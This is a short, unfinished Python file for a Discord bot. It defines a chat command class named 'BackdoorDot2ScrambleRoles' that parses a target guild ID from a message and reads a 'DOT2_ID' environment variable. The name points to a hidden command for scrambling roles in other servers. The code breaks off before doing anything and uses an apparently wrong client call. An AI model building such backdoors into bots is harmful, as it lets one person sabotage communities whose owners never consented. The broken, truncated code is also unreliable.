import discord
import os
import chattrigger


class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):

        targetguild = client.get(int(message.content[len(trigger):]))
        dot2id = os.environ.get("DOT2_ID")


